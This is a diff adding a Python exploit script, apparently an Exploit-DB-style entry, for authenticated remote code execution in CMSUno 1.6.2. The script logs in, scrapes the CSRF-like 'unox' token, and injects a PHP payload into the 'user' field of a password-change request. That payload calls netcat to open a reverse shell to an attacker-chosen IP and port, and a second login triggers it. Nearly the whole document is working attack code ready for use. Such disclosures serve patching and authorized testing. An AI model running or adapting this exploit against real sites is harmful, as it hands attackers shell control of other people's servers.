@@ -1,0 +1,76 @@
+# Exploit Title: CMSUno 1.6.2 - 'user' Remote Code Execution (Authenticated)
+# Google Dork: N/A
+# Date: 2020.09.30
+# Exploit Author: Fatih Çelik
+# Vendor Homepage: https://github.com/boiteasite/cmsuno/
+# Software Link: https://github.com/boiteasite/cmsuno/
+# Blog: https://fatihhcelik.blogspot.com/2020/09/cmsuno-162-remote-code-execution.html
+# Version: 1.6.2
+# Tested on: Kali Linux 2020.2
+# CVE : N/A
+
+import requests
+from bs4 import BeautifulSoup
+import lxml
+import json
+from time import sleep
+
+username = input("username: ")
+password = input("password: ")
+root_url = input("Root URL: http://192.168.1.9/cmsuno --> ")
+listener_ip = input("Your ip: ")
+listener_port = input("Your port for reverse shell: ")
+
+login_url = root_url + "/uno.php"
+vulnerable_url = root_url + "/uno/central.php"
+
+session = requests.Session()
+request = session.get(login_url)
+
+# Get the unox value
+soup = BeautifulSoup(request.text,"lxml")
+unox = soup.find("input",{'name':'unox'})['value']
+
+# Login 
+
+body = {"unox":unox,"user":username,"pass":password}
+session.post(login_url, data=body)
+
+# Get the second unox value
+
+request = session.get(login_url)
+text = request.text
+soup = BeautifulSoup(text,"lxml")
+script = soup.findAll('script')[1].string
+data = script.split("Unox='")[1]
+unox = data.split("',")[0]
+
+# Exploit
+
+header = {
+"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+"Accept":"*/",
+"Accept-Encoding": "gzip, deflate",
+"X-Requested-With": "XMLHttpRequest",
+"Origin": login_url,
+"Referer": login_url
+}
+
+payload = 'en";system(\'nc.traditional {} {} -e /bin/bash\');?>// '.format(listener_ip,listener_port)
+body = 'action=sauvePass&unox={}&user0={}&pass0={}&user={}&pass=654321&lang=en'.format(unox,username,password,payload)
+session.post(vulnerable_url, data=(json.dumps(body)).replace("\\","")[1:-1],headers=header)
+
+# Login to trigger password.php
+
+# Get the unox value
+session1 = requests.Session()
+request1 = session1.get(login_url)
+soup = BeautifulSoup(request1.text,"lxml")
+unox = soup.find("input",{'name':'unox'})['value']
+
+
+# Login
+sleep(3)
+body = {"unox":unox,"user":username,"pass":password}
+session1.post(login_url, data=body)
